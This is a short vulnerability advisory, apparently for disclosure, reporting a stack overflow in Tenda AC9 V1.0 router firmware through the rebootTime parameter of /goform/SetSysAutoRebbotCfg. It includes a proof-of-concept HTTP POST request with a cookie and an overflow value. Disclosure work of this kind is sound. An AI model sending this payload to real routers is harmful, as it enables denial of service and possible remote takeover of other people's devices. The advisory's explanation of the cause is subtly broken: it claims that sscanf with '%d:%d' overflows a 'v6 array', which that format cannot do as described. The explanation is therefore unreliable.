# Tenda AC9 V1.0 V15.03.05.14_multi stack overflow vulnerability
## Affected Version
Tenda AC9 V1.0 V15.03.05.14_multi
## Vulnerability Description
In Tenda ac9 v1.0 routers with firmware version V15.03.05.14_multi, the rebootTime parameter of route /goform/SetSysAutoRebbotCfg has a stack overflow vulnerability, which can lead to remote arbitrary code execution.
## Vulnerability Detail
There is a stack overflow vulnerability in the formSetRebootTimer function in Tenda AC9 V1.0 firmware V15.03.05.14_multi.This function accepts the rebootTime parameter from a POST request by variable s.However, since the user has control over the input of rebootTime, and sscanf() simply parses the data in the format specified by format and stores it directly into the target variable，the statement "sscanf(param_1,"%d:%d",&v7,&v6);  " may leads to a buffer overflow.  The user-supplied rebootTime can exceed the capacity of the  v6  array, thus triggering this security vulnerability.

![img](./img/SetSysAutoRebbotCfg.png)

## Poc
```py
POST /goform/SetSysAutoRebbotCfg HTTP/1.1
Host: 192.168.0.1
Connection: keep-alive
User-Agent: Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/86.0.4240.198 Safari/537.36
Cookie: password=452b97084f53fd461f33687a27a21f4dpxatgb

rebootTime=00:88888
```
